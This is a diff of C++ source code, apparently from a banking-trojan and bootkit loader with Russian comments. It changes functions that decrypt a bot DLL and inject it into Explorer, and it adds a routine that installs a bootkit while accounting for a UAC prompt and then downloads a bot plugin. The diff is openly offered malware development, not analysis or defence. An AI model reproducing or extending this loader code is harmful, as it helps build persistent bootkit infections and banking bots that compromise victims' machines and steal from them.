@@ -407,7 +407,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 
 bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 {
-	LDRDBG("BRDS Explorer", "Запускаем длл бота ");
+	LDRDBG("BRDS Explorer", "DoStartBotDll() запущена");
 
 	// 310_ld попытка получить файл плага с кеша в Explorer
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("310_ld"));
@@ -430,12 +430,15 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 		// Расшифровываем содержимое
 		if (DelayBeforeStart != 0) pSleep(DelayBeforeStart);
 
-		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована ");
+		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована.Запускаем Bot.plug");
 		ExplorerLoadDLL(InitData, Module, Size);
+
+		LDRDBG("BRDS Explorer", "Bot.plug запущен.");
 
 		MemFree(Module);
 	}
 
+	LDRDBG("BRDS Explorer", "DoStartBotDll() завершена.");
 
 	return DLLLoader::DLLLoadedInExplorer;
 }
@@ -565,7 +568,7 @@ VOID WINAPI Start(
 void ExplorerLoadAndRunBotPlug(void* Arguments)
 {
 	LDRDBG("ExplorerLoadAndRunBotPlug", "started.");
-	DoStartBotDll(NULL, 5000);
+	DoStartBotDll(NULL, 0);
 }
 
 void StartBootkitDll(void* Arguments)
@@ -719,13 +722,28 @@ BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 	return FALSE;
 }
 
+BOOL WINAPI BkDropWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
+{
+	ResetBootkitLoaderFlag();
+
+	// Устанавливаем буткит часть с учетов возможного UAC
+	bool InstallResult = BkDeployAndInstallWithPossibleUac(SelfBody, SelfBodySize);
+	LDRDBG("BkDropWithPossibleUac", "BkDeployAndInstallWithPossibleUac return %d", InstallResult);
+
+	if (InstallResult == false) return FALSE;
+
+	// Если получается установить - скачиваем ботплаг.
+	// Закачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
+	return LoadPlugToCache(FALSE, 0);
+}
+
 BOOL WINAPI BkDrop()
 {
 	ResetBootkitLoaderFlag();
 
 	// Устанавливаем буткит часть
 	// Если получается установить - скачиваем ботплаг.
-	bool InstallResult = DeployAndInstallBkDll();
+	bool InstallResult = BkDeployAndInstallDll();
 	LDRDBG("BkDrop", "DeployAndInstallBkDll return %d", InstallResult);
 
 	if (InstallResult == false) return FALSE;
